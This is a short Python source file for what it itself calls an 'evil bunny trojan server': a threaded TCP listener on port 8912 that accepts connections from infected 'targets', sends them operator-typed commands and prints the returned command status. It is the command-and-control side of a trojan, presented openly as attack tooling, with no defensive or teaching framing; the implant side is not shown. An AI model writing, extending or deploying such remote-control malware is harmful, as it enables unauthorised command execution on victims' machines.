import socket
import sys
import threading

############################################################################

HOST = ''   # Symbolic name, meaning all available interfaces
PORT = 8912 # Arbitrary non-privileged port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

############################################################################
 
def main() :

    #Bind socket to local host and port
    try:
        s.bind((HOST, PORT))
    except socket.error as msg:
        print('Bind failed. Error Code : {} Message: {}'.format(str(msg)))
        sys.exit()
         
    #Start listening on socket
    s.listen(10)
    
    print("Server listening on port {}".format(str(PORT)))
     
    #now keep talking with the client
    while 1:
        #wait to accept a connection - blocking call
        sock, addr = s.accept()
        print('Connected with {}: {}'.format(addr[0], str(addr[1])))
        
        threading.Thread(target=client_handler ,args=(sock,addr[0])).start()
     
    s.close()



def client_handler(sock, ip):
    """Function for handling connections. This will be used to create threads"""

    #Sending message to connected client
    sock.send('You are now connected to the evil bunny trojan server'.encode('utf-8'))
    
    #infinite loop so that function do not terminate and thread do not end.
    while True:
        reply = input("Command to target: ")
        sock.send(reply.encode('utf-8'))
        if reply == 'exit':
            sys.exit()
        #Receiving from client
        data = sock.recv(1024)
        if data:
            print("last command status: " + data.decode('utf-8'))
        else:
            break

    #came out of loop
    sock.close()

if __name__ == '__main__':
    main()